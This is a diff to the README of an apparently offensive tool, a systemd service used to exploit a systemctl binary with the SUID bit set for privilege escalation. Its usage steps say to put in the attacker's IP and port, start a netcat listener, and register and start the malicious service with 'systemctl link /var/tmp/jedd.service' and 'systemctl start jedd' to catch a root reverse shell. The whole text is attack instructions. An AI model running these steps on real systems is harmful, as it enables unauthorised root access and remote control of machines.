@@ -3,9 +3,15 @@ Basic service used for exploitating systemctl with SUID bit set.
 
 
 ## To use
-- Change the exploit to your IP address
+- Change the exploit to your IP address and port number
 - optional - change the name
-- start NC listener on 443, or where the listener is set in the payload
+- start NC listener
 - enable the service
-  - ``` enable PATH/TO/SERVICE```
-- Catch shell
+  - ```systemctl link PATH/TO/name.service```
+  - ``` systemctl start NAME```
+
+### example
+```
+systemctl link /var/tmp/jedd.service
+systemctl start jedd
+```
